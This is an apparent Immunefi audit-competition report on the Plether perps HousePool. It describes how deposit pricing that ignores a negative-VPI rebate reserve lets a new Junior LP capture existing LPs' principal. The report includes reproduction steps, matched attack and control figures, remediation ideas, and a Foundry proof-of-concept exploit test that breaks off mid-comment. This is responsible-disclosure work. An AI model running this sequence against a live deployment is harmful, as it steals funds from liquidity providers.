# \#99577 [SC-Critical] Reserve-backed negative VPI is excluded from Junior deposit pricing, letting a new LP capture existing LP principal

**Submitted on Nov 14th 2026 at 10:28:19 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99577
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Brief / Introduction

I found a way to take value from existing Junior LPs by depositing while a negative-VPI rebate is outstanding. The rebate has already been paid out of HousePool cash, and the trader is required to lock the matching amount in a protected clearinghouse reserve. The reserve will be collected back from that position when the negative lifetime VPI is settled. Yet the reserve is absent from the NAV used to price new Junior shares.

That creates a short window in which an incoming LP receives more shares than it would receive if the already-funded recovery were recognized. When the position closes, the clearinghouse returns the reserved USDG to HousePool. The recovery is then shared with the new LP, even though the original LPs funded the rebate before the new LP joined.

I reproduced this at an unchanged Pyth price of 1.00, using normal V3 order submission and LP epochs. The attack and control open the same skew-reducing short at the same pool depth. Both create exactly **2,599.121038 USDG** of negative VPI and lock exactly that amount as a reserve. In the attack, I let the LP deposit settle before the short closes. In the control, I close the short and recover the reserve before settling that same deposit. The only deliberate change is whether the new shares are priced before or after recovery of the outstanding reserve.

In the one-cycle comparison, the attacker gains **2,214.814920 USDG** relative to control and the passive Junior LPs lose **2,214.814929 USDG** relative to control. I also redeemed the same passive Junior shares in both branches. They received **221.481493 USDG less in real cash** in the attack branch. The close emitted the clearinghouse `AssetSeized` event for actual USDG returned to HousePool; I checked that transfer against the protected reserve rather than relying only on NAV estimates.

Finally, I created the initial skew with the attacker's own long and repeated the cycle eight times. After including that long's opening and closing costs, the attacker finishes **8,032.720068 USDG ahead**, while the passive Junior LPs' redeemable position value falls by **17,426.592038 USDG**. No change in the oracle price, administrative action during exploitation, or cooperation from another trader is needed.

## Vulnerability Details

### 1. A skew-reducing open sends cash out of HousePool before the position is closed

A trader can open a short against an outstanding long skew. That reduces aggregate skew, so `OpenAccountingLib` computes a negative VPI. `CfdEnginePlanLib` turns the negative net trade cost into a pool rebate payout:

```solidity
delta.poolRebatePayoutAssets =
    openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

`CfdEngineSettlementSidecar.executeOpen()` then executes the payout using `HousePool.payOut()`. `HousePool.payOut()` subtracts the transferred amount from `accountedAssets` and transfers USDG to the clearinghouse. Opening fees are handled separately within settlement, so the gross VPI and the immediate net rebate transfer should not be confused. In my test the combined result is a **2,599.127382 USDG** fall in Junior NAV while the short's accrued VPI is **-2,599.121038 USDG**. The small difference is unrelated settlement accounting.

The consequence for LP entry pricing is that HousePool's live physical cash and reconciled Junior principal have already fallen before the new shares are minted.

### 2. The same negative-VPI obligation is fully reserved in the clearinghouse

At open, `CfdEnginePlanLib` sets the reserve target to the negative portion of the position's lifetime VPI. The sidecar then locks the reserve through `MarginClearinghouse.lockVpiRebateReserve()` or reclassifies already locked pledge. The reserve sits in the `vpiRebateReserveBalances` sub-ledger and is not available for withdrawal or unrelated action charges.

For the matched opening in both branches I observed:

```text
short lifetime VPI after open (atoms) -2599121038
vpiRebateReserve while open (atoms) 2599121038
```

The trader cannot simply withdraw the rebate and walk away. This is already funded value, held against a specific open-position settlement obligation, rather than a speculative VPI amount that the trader might owe in the future.

### 3. Full closing collects the reserve, but the recovery reaches a different LP cohort

`CloseAccountingLib` enforces the lifetime clamp:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

On a full close of the negative-VPI position, that rule prevents the trader from keeping a net negative lifetime VPI balance. `CfdEngineSettlementSidecar` consumes the protected reserve, and `MarginClearinghouse.consumeVpiRebateReserve()` transfers the USDG to HousePool and emits `AssetSeized`.

I read that event from the clearinghouse address and checked the trader, USDG token, amount, and HousePool recipient. For the attack branch:

```text
FINAL physical USDG recovered by HousePool (atoms) 2599121038
FINAL negative VPI reserve before close (atoms) 2599121038
```

The full reserve is actually paid back to the pool. The tested short closes with zero remaining reserve. In the control branch the close can collect slightly more than the original reserve because its close-time economics differ; the event records **2,601.196218 USDG** returned against the same **2,599.121038 USDG** opening reserve.

### 4. Junior deposit pricing ignores the amount held for that recovery

`HousePool.totalAssets()` counts USDG held by HousePool, not USDG held in the clearinghouse's protected negative-VPI sub-ledger. `CfdEngineProtocolLens.getHousePoolInputSnapshot()` supplies those physical pool assets and the terminal mark-price adjustment. `HousePoolAccountingLib.buildReconcileSnapshot()` then determines distributable LP equity from physical assets, trader claims, and the signed terminal price delta. There is no corresponding asset entry for the reserved negative-VPI recovery.

`TerminalNavBookV2` likewise constructs its position valuation from lots, entry cost, and a collectible cap; it does not add `vpiRebateReserveAssets` to LP valuation. At `HousePool._settleLpEpoch()`, reconciliation writes the depressed value to `juniorPrincipal`, and the Junior deposit phase uses that principal as the share-pricing numerator:

```solidity
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
```

The cash is absent from current LP equity when the entrant's shares are calculated, despite the protected account-level backing for its recovery. Once the short closes and the cash returns, the new shares participate in it. The existing Junior LPs end up with a smaller percentage of a recovery funded before the new LP joined.

### 5. The attack uses ordinary LP epochs and permissions

The entire sequence uses the released asynchronous LP process:

| Stage | Action |
|---|---|
| Before the epoch cutoff | The new Junior LP requests a deposit. A long position already establishes the skew. |
| Before deposit pricing | The attacker's short opens against that skew, receives negative VPI, and locks the matching reserve. |
| Epoch settlement | **Attack:** settle the LP deposit while the reserve is outstanding. **Control:** close the short and recover the reserve first, then settle the deposit. |
| After deposit activation | In the attack, close the short, returning the reserved USDG after the new Junior shares are issued. |
| After cooldown and the next funding epoch | Redeem the attacking LP's shares and collect USDG. |

The test calls the ordinary `OrderRouter.commitOrder(OrderV3Types.OrderRequest)`, `executeOrder`, `updateMarkPrice`, `settleLpEpoch`, and tranche request/claim functions. The keeper actions are permissionless. The owner-side configuration in `setUp()` only applies the published Senior-cap parameters to the test fixture; the attacker does not need the owner to act during the sequence.

## Impact Details

The loss is to the existing Junior LPs' principal value. It is not a trader-only VPI rebate, not a hypothetical claim, and not limited to unclaimed yield. The attacker owns both the short and the incoming Junior LP position, so the value captured through share pricing offsets trading charges and can leave the passive Junior cohort worse off.

### Matched one-cycle comparison

Both branches start from the same checkpoint and open with the same **2,599.121038 USDG** negative VPI. The opening reserve is also identical. The difference is the timing of the short's close relative to the deposit's pricing.

| Result | Deposit priced before reserve recovery (attack) | Reserve recovered before deposit pricing (control) |
|---|---:|---:|
| Opening negative VPI | -2,599.121038 | -2,599.121038 |
| VPI reserve at short close | 2,599.121038 | 2,599.121038 |
| Physical USDG returned to HousePool | 2,599.121038 | 2,601.196218 |
| Attacker PnL | +1,130.627790 | -1,084.187130 |
| Passive Junior PnL | -2,239.467136 | -24.652207 |
| Passive Junior cash received for the same redeemed shares | 74,754.698817 | 74,976.180310 |

The **attack-versus-control** PnL shift is **+2,214.814920 USDG to the attacker** and **-2,214.814929 USDG to the passive Junior LPs**. The nine-atom difference is rounding-level. For the separately redeemed slice of passive shares, the actual payout difference is **221.481493 USDG**. I do not equate that smaller slice with the full cohort's marked loss.

### Four-cycle attack and control

| Four cycles, 4.25 million USDG attacking Junior LP | Attack | Control |
|---|---:|---:|
| Attacker cumulative PnL | +4,537.225587 | -4,336.866036 |
| Passive Junior cumulative PnL | -8,973.630741 | -99.539109 |

The incremental value transfer is **8,874.091623 USDG to the attacker**, compared with **8,874.091632 USDG less value for the passive Junior LPs**. Each attack cycle independently asserts that the short earned negative VPI, that the full negative accrual was reserved, that the short's close recovered the required amount, and that the attacking coalition made a profit. The control trades lose money instead.

### Self-contained eight-cycle attack

I also removed dependence on a pre-existing honest skew by creating the long through a second attacker-controlled trader account. I kept that long open for the full sequence, ran eight negative-VPI entry cycles, and closed it at the end. The final figures include that long's opening and closing costs:

| Eight-cycle result | USDG |
|---|---:|
| Attacker net PnL, including the long | **+8,032.720068** |
| Passive Junior change in redeemable position value | **-17,426.592038** |
| Passive Junior's starting capital | 750,000.000000 |
| Loss relative to that starting capital | **about 2.32%** |

These numbers come from a constant-price test under the release fee and risk parameters. The attacker must supply the LP capital and trader margin, but does not depend on moving the oracle price or having somebody else open the initial skew.

### Trader-only control

Without the Junior LP entry, the same negative-VPI short round trip **loses 1,042.683150 USDG** after charges and leaves honest Junior slightly positive (**+1.723447 USDG**). The attacker profit therefore does not come merely from claiming the negative VPI as a trader. It requires buying Junior shares in the interval when the reserve exists but has not yet been reflected in entry pricing.

## Why this is not the previously documented VPI liquidity-depth issue

The prior VPI depth issue concerns manipulating liquidity around a skew-reducing close to change the rebate computed by the curve. My test does not need to increase the curve rebate. The opening negative VPI and the protected reserve are identical in the matched attack/control branches. The attack is successful because the LP deposit is priced before the reserved cash comes back to the pool, while the control prices the deposit after that cash is recovered. The observed PnL shift is almost exactly equal and opposite between the attacker and passive Junior LPs.

This is also a different settlement path from the positive-VPI LP exit issue: that case involves recognizing a refundable **positive charge** as redeemable LP equity and withdrawing before the trader's rebate. Here the pool has already paid a **negative-VPI rebate**, and the clearinghouse holds a dedicated, nonwithdrawable reserve for the return. The attacker **deposits** before the reserved recovery is reflected in LP pricing. Correcting the positive side by deferring revenue or deducting refundable positive accrual does not, by itself, add this negative reserve to Junior deposit valuation.

The accounting documents explain that anticipated VPI is kept out of terminal price-PnL calculations. The issue here is narrower: the negative-VPI rebate has already moved real USDG out of HousePool and a precisely sized reserve has already been funded. This is not an attempt to capitalize a speculative future fee. It is an existing funded settlement balance whose recovery changes which Junior LP cohort owns the value. The matched-timing cash withdrawals show the result rather than relying only on that accounting interpretation.

## Suggested Remediation

I would keep the negative-VPI reserve segregated and nonwithdrawable, but make sure its backed recovery is assigned to the LP cohort that funded the rebate when new shares are priced. One approach is to expose the aggregate recoverable negative-VPI reserve in the authenticated accounting snapshot and recognize it as a **pricing receivable**, without counting it as HousePool free cash or increasing redemption funding capacity before the transfer occurs. The receivable must be released exactly once as the reserve is consumed or otherwise settled, so it is never counted twice.

An alternative is to retain the funded rebate as a separately attributed pending settlement balance rather than remove it from LP-owned equity at open, then account for the actual transfer when the position settles. Either approach needs to preserve the existing trader reserve protection, mark-price terminal liabilities, and the Junior/Senior waterfall. Merely increasing the redemption cash budget would not correct the share-price dilution.

## References

- [`HousePool._settleLpEpoch()` reconciliation and Junior deposit pricing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L823-L920)
- [`HousePool.payOut()` and `totalAssets()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L599-L613)
- [`CfdEnginePlanLib` open rebate and reserve target](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEnginePlanLib.sol#L331-L349)
- [`CfdEngineSettlementSidecar.executeOpen()` pool rebate payout and reserve lock](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L435-L478)
- [`MarginClearinghouse` protected reserve locking and consumption](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L841-L907)
- [`CloseAccountingLib` negative lifetime-VPI clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
- [`HousePoolAccountingLib.buildReconcileSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L57-L78)
- [`CfdEngineProtocolLens.getHousePoolInputSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L49-L74)
- [`TerminalNavBookV2._curveInputFromEngine()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L417-L449)
- [`SECURITY.md` exact symmetric LP NAV rules](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L849-L876)
- [`ACCOUNTING_SPEC.md` reserve protection and terminal NAV](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L815-L825)
- [Plether audit competition and scope](https://immunefi.com/audit-competition/plether/scope/)



## Proof of Concept

I wrote a Foundry PoC and placed the complete Solidity file at:

`packages/perps/test/perps/insight/Cohort_negvpimirror_MatchedTiming.t.sol`

The test inherits the repository's existing `BasePerpTest` fixture and uses direct V3 Router order submissions, actual LP epoch requests, claims and settlement, and actual clearinghouse transfers. I did not change any contract under `packages/perps/src`. The test fixture supplies USDG and signed Pyth updates, as permitted by the competition. The price remains fixed at `100000000` (1.00) throughout.

I used the release-style parameters: VPI factor 1%, maximum skew 40%, maintenance margin 0.1%, initial margin 0.2%, FAD margin 3%, execution fee 4 bps, Senior cap 40 million USDG and Senior share cap 80%. I funded 750,000 USDG of passive Junior liquidity and 2.5 million USDG of passive Senior liquidity. The attacker uses a 4.25 million USDG Junior deposit and funded trader accounts. Time advances only to satisfy the normal one-hour LP epoch, request cutoff and cooldown rules.

## Reproduction Steps

1. Set up the pool with the stated release parameters. Open the initial long to create the required skew.
2. Record a checkpoint. In the attack branch, request the attacking Junior deposit and open a matching skew-reducing short before the deposit is priced. Confirm negative VPI, the matching clearinghouse reserve, and the decline in Junior NAV.
3. Settle the LP epoch while the negative-VPI reserve is still outstanding, then claim the attacking LP shares. Close the short and confirm that the actual reserve is transferred to HousePool.
4. After the cooldown, request and claim the attacking Junior redemption. Record attacker and passive Junior balances.
5. Restore the checkpoint and run the control with the same short opening and reserve. This time, close the short and recover the reserve **before** the Junior deposit is priced. Complete the same LP exit and record balances.
6. Redeem an identical slice of the passive Junior LP's shares in both branches. Compare the actual USDG received, not just the NAV quote.
7. Repeat the comparison for four cycles. Separately, create the long through an attacker-controlled account and run eight cycles, then close the long and check final net attacker PnL.
8. Confirm that all four tests pass and that `packages/perps/src` has no changes.

## Complete Solidity PoC Source

**Save as:** `packages/perps/test/perps/insight/Cohort_negvpimirror_MatchedTiming.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Negative-VPI reserve-window Junior LP entry PoC.
///         A skew-reducing open earns a VPI rebate V that HousePool pays out of LP cash immediately, so Junior NAV
///         drops by V. The trader must lock V in a protected vpiRebateReserve, and the lifetime clamp
///         (CloseAccountingLib: proportionalAccrual + closeVpi >= 0) GUARANTEES that the position's close (or
///         liquidation) returns at least V to the pool. NAV however excludes that guaranteed receivable, so the
///         Junior share price is temporarily depressed by V. An attacker LP that DEPOSITS while the reserve is
///         outstanding buys Junior at the depressed price; when the attacker's trader closes, V flows back and is
///         shared pro rata, so the attacker LP captures f*V of value that belonged to the pre-existing Junior LPs.
///         The attacker trader's VPI nets to zero (rebate V, clawback V), so the coalition profit is f*V - fees.
///
///         Production entrypoints only; constant honest Pyth price 1.00; release risk params and Senior caps.
contract CohortNegVpiMatchedTimingPoC is BasePerpTest {

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant LOT = 1e20; // 100 USDG notional at PRICE

    address internal constant HLONG = address(0x40E57); // honest trader holding the pre-existing long skew
    address internal constant ALONG = address(0xA7700); // attacker long (variant: attacker manufactures the skew)
    address internal constant TRADER = address(0xA7701); // attacker short: earns the skew-reducing rebate
    address internal constant ALP = address(0xA7704); // attacker Junior LP
    address internal constant KEEPER = address(0xA7705); // attacker keeper

    uint256 internal constant HONEST_JUNIOR = 750_000e6;
    uint256 internal constant HONEST_SENIOR = 2_500_000e6;

    uint256 internal nextClientOrderId = 1;
    uint256 internal attackerIn;
    uint256 internal longLots;

    struct CycleOut {
        uint256 f;
        int256 vpiOpen; // lifetime VPI of the short after its open (negative = rebate)
        uint256 reserve; // vpiRebateReserve held while open
        int256 juniorNavOnOpen; // Junior NAV change from the rebate open
        int256 closeVpi; // close VPI delta applied (positive = charge / clawback)
        int256 juniorNavOnClose; // Junior NAV change from the close
        uint256 lpRedeemed;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return HONEST_JUNIOR;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return HONEST_SENIOR;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC
        vm.roll(vm.getBlockNumber() + 1);

        _mintAttacker(TRADER, 400_000e6);
        vm.startPrank(TRADER);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(TRADER, 400_000e6);
        vm.stopPrank();
        vm.prank(ALP);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        _fundTrader(HLONG, 400_000e6);
    }

    // Direct V3 Router submission, using the same permissive execution bounds
    // the repository's legacy test adapter generates. The next public call is
    // router.commitOrder, executed as the actual trader.
    function _commitV3(
        address trader,
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        uint256 targetPrice = ((side == CfdTypes.Side.LONG) == isClose)
            ? type(uint256).max : 1;
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(nextClientOrderId++),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(_now()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        orderId = router.commitOrder(req);
        assertGt(orderId, 0, "direct V3 commit failed");
    }

    // ---------------------------------------------------------------- helpers

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _warpTo(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _nextEpochStart() internal view returns (uint256) {
        return (_now() / 1 hours + 1) * 1 hours;
    }

    function _mintAttacker(
        address a,
        uint256 amt
    ) internal {
        settlementToken.mint(a, amt);
        attackerIn += amt;
    }

    function _settle() internal {
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(upd);
    }

    function _pokeMark() internal {
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.updateMarkPrice(upd);
    }

    function _executeHead() internal {
        uint64 id = router.nextExecuteId();
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.executeOrder(id, upd);
    }

    function _netDepth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _attackerValue() internal view returns (uint256 v) {
        address[4] memory all = [TRADER, ALP, KEEPER, ALONG];
        for (uint256 i = 0; i < 4; ++i) {
            v += settlementToken.balanceOf(all[i]);
            v += clearinghouse.balanceAssets(all[i]);
            v += engine.traderClaimBalanceAssets(all[i]);
        }
        v += juniorVault.convertToAssets(juniorVault.balanceOf(ALP));
    }

    function _attackerPnl() internal view returns (int256) {
        return int256(_attackerValue()) - int256(attackerIn);
    }

    function _honestJuniorValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    function _openLong(
        address who
    ) internal {
        longLots = (_netDepth() * 4 / 10) / 100e6 - 1;
        _commitV3(who, CfdTypes.Side.LONG, longLots * LOT, 60_000e6, false);
        _executeHead();
        (uint256 sz,,,,,,) = engine.positions(who);
        assertEq(sz, longLots * LOT, "long filled");
    }

    function _closeLong(
        address who
    ) internal {
        _commitV3(who, CfdTypes.Side.LONG, longLots * LOT, 0, true);
        _executeHead();
        (uint256 sz,,,,,,) = engine.positions(who);
        assertEq(sz, 0, "long closed");
    }

    /// @dev Attacker short of the same size as the standing long: skew -> 0, VPI rebate paid from pool cash.
    function _openRebateShort() internal returns (int256 vpi, int256 navDelta) {
        int256 j0 = int256(juniorVault.totalAssets());
        _commitV3(TRADER, CfdTypes.Side.SHORT, longLots * LOT, 60_000e6, false);
        _executeHead();
        (uint256 sz,,,,,, int256 acc) = engine.positions(TRADER);
        assertEq(sz, longLots * LOT, "short filled");
        vpi = acc;
        navDelta = int256(juniorVault.totalAssets()) - j0;
    }

    function _closeShort() internal returns (int256 closeVpi, int256 navDelta) {
        _commitV3(TRADER, CfdTypes.Side.SHORT, longLots * LOT, 0, true);
        ICfdEngineTypes.ClosePreview memory p = engineLens.previewClose(TRADER, longLots * LOT, PRICE);
        assertTrue(p.valid, "close preview valid");
        closeVpi = p.vpiDeltaAssets;
        // Check the actual clearinghouse-to-HousePool settlement transfer,
        // not merely a net LP NAV preview delta.
        uint256 reserveBefore = clearinghouse.vpiRebateReserveAssets(TRADER);
        assertGt(reserveBefore, 0, "VPI reserve absent before short close");
        int256 j0 = int256(juniorVault.totalAssets());
        vm.recordLogs();
        _executeHead();
        Vm.Log[] memory entries = vm.getRecordedLogs();
        uint256 cashRecoveredByPool;
        bytes32 assetSeizedSig = keccak256("AssetSeized(address,address,uint256,address)");
        for (uint256 i; i < entries.length; ++i) {
            Vm.Log memory entry = entries[i];
            if (entry.emitter != address(clearinghouse) || entry.topics.length != 3) continue;
            if (entry.topics[0] != assetSeizedSig) continue;
            if (entry.topics[1] != bytes32(uint256(uint160(TRADER)))) continue;
            if (entry.topics[2] != bytes32(uint256(uint160(address(settlementToken))))) continue;
            (uint256 amount, address recipient) = abi.decode(entry.data, (uint256, address));
            if (recipient == address(pool)) cashRecoveredByPool += amount;
        }
        console2.log("FINAL physical USDG recovered by HousePool (atoms)", cashRecoveredByPool);
        console2.log("FINAL negative VPI reserve before close (atoms)", reserveBefore);
        assertGe(
            cashRecoveredByPool,
            reserveBefore,
            "reserved VPI was not physically returned to pool"
        );
        navDelta = int256(juniorVault.totalAssets()) - j0;
        (uint256 sz,,,,,,) = engine.positions(TRADER);
        assertEq(sz, 0, "short closed");
        assertEq(clearinghouse.vpiRebateReserveAssets(TRADER), 0, "reserve consumed");
    }

    // ---------------------------------------------------------------- one cycle

    /// @param attack true: settle the LP deposit with VPI reserve outstanding, then close the short.
    ///               false: close the short before pricing the LP deposit, at the same opening VPI.
    function _cycle(
        uint256 lpAssets,
        bool attack
    ) internal returns (CycleOut memory o) {
        uint256 e = _nextEpochStart();
        assertLt(_now(), e - 300, "before LP request cutoff");

        uint256 w = settlementToken.balanceOf(ALP);
        if (w < lpAssets) {
            _mintAttacker(ALP, lpAssets - w);
        }
        _pokeMark();
        vm.prank(ALP);
        uint256 depId = juniorVault.requestDeposit(lpAssets, ALP, ALP);

        // Both branches open at the SAME initial pool depth.
        // Both create the SAME protected negative-VPI reserve.
        (o.vpiOpen, o.juniorNavOnOpen) = _openRebateShort();
        o.reserve = clearinghouse.vpiRebateReserveAssets(TRADER);

        _warpTo(e + 10);

        if (!attack) {
            // CONTROL: recover the reserve before pricing entry.
            (o.closeVpi, o.juniorNavOnClose) = _closeShort();
        }

        _settle();

        vm.prank(ALP);
        juniorVault.claimDeposit(depId, lpAssets, ALP, ALP);

        o.f = (
            juniorVault.balanceOf(ALP) * 1e18
        ) / juniorVault.totalSupply();

        if (attack) {
            // ATTACK: price entry while the reserve is outstanding.
            // Then recover it for the newly enlarged LP cohort.
            (o.closeVpi, o.juniorNavOnClose) = _closeShort();
        }

        // (4) attacker LP exits after the 1h cooldown
        _warpTo(e + 1 hours + 60);
        _pokeMark();
        uint256 sh = juniorVault.maxRequestRedeem(ALP);
        vm.prank(ALP);
        uint256 rid = juniorVault.requestRedeem(sh, ALP, ALP);
        _warpTo(e + 2 hours + 10);
        _settle();
        uint256 cs = juniorVault.claimableRedeemRequest(rid, ALP);
        uint256 b0 = settlementToken.balanceOf(ALP);
        vm.prank(ALP);
        juniorVault.claimRedeem(rid, cs, ALP, ALP);
        o.lpRedeemed = settlementToken.balanceOf(ALP) - b0;
        assertEq(juniorVault.balanceOf(ALP), 0, "attacker LP fully out");
        assertEq(juniorVault.pendingRedeemRequest(rid, ALP), 0, "attacker exit fully funded");
    }

    function _log(
        uint256 i,
        CycleOut memory o,
        int256 dAtt,
        int256 dHon
    ) internal pure {
        console2.log("---- cycle", i);
        console2.log("  attacker share of Junior f (bps)", o.f / 1e14);
        console2.log("  short lifetime VPI after open (atoms)", o.vpiOpen);
        console2.log("  vpiRebateReserve while open (atoms)", o.reserve);
        console2.log("  Junior NAV change on rebate open", o.juniorNavOnOpen);
        console2.log("  close VPI delta (clawback)", o.closeVpi);
        console2.log("  Junior NAV change on close", o.juniorNavOnClose);
        console2.log("  attacker PnL this cycle (atoms)", dAtt);
        console2.log("  honest Junior PnL this cycle", dHon);
    }

    function _run(
        uint256 n,
        uint256 lpAssets,
        bool attack
    ) internal returns (int256 cumAtt, int256 cumHon) {
        uint256 hon0 = _honestJuniorValue();
        int256 att0 = _attackerPnl();
        int256 prevAtt = att0;
        int256 prevHon = int256(hon0);
        for (uint256 i = 1; i <= n; ++i) {
            CycleOut memory o = _cycle(lpAssets, attack);
            _pokeMark();
            int256 att = _attackerPnl();
            int256 hon = int256(_honestJuniorValue());
            _log(i, o, att - prevAtt, hon - prevHon);
            assertLt(o.vpiOpen, 0, "skew-reducing open earned a rebate");
            assertEq(o.reserve, uint256(-o.vpiOpen), "rebate fully reserved");
            assertApproxEqAbs(o.juniorNavOnOpen, o.vpiOpen, 1e6, "Junior NAV drops by the rebate");
            if (attack) {
                // close happens at a LARGER depth (attacker LP capital joined), so the fresh curve charge is below V;
                // the lifetime clamp lifts it to exactly V: the pool's recovery of V is guaranteed
                assertEq(o.closeVpi, -o.vpiOpen, "close claws back exactly the rebate (lifetime clamp)");
            } else {
                assertGe(o.closeVpi, -o.vpiOpen, "control: close charge >= rebate");
            }
            if (attack) {
                // For the attack, the new LP is already in the pool when
                // the reserve is recovered, so the immediate NAV increase
                // is directly comparable to its opening VPI.
                assertApproxEqAbs(
                    o.juniorNavOnClose,
                    -o.vpiOpen,
                    1e6,
                    "attack: Junior NAV recovers the rebate"
                );
            }
            // For the control, do NOT compare net NAV-preview change to
            // gross VPI: it can incorporate epoch/reconcile adjustments.
            // _closeShort verifies physical USDG return via AssetSeized,
            // and the close-side clamp is checked immediately above.
            if (attack) {
                assertGt(att - prevAtt, 0, "attacker profits every cycle");
            }
            prevAtt = att;
            prevHon = hon;
        }
        cumAtt = _attackerPnl() - att0;
        cumHon = int256(_honestJuniorValue()) - int256(hon0);
    }

    // ---------------------------------------------------------------- tests

    /// @notice Honest trader holds a long skew; attacker (short trader + Junior LP + keeper) farms the rebate window.
    ///         Both branches open the same short before entry pricing; only recovery order changes.
    function test_PoC_HonestSkew_AttackVsControl() public {
        _openLong(HLONG); // honest pre-existing skew (its VPI is already in Junior NAV before the attack starts)
        _warpTo(_now() + 60);
        uint256 snap = vm.snapshotState();

        (int256 attA, int256 honA) = _run(4, 4_250_000e6, true);
        uint256 honestEndAttack = _honestJuniorValue();
        vm.revertToState(snap);
        (int256 attC, int256 honC) = _run(4, 4_250_000e6, false);
        uint256 honestEndControl = _honestJuniorValue();

        console2.log("=== honest skew, 4 cycles, attacker LP 4.25M");
        console2.log("ATTACK  attacker cumulative PnL (atoms)", attA);
        console2.log("ATTACK  honest Junior cumulative PnL", honA);
        console2.log("CONTROL attacker cumulative PnL (atoms)", attC);
        console2.log("CONTROL honest Junior cumulative PnL", honC);
        console2.log("honest Junior loss attributable to attack (atoms)", int256(honestEndControl) - int256(honestEndAttack));
        assertGt(attA, 0, "attack profitable at a constant price");
        assertLt(attC, 0, "control: same trades lose fees");
        assertGt(honestEndControl, honestEndAttack, "honest Junior LPs lose value to the attack");
    }

    /// @notice Second control: the same rebate round trip with NO attacker LP. The trader alone only pays fees, and
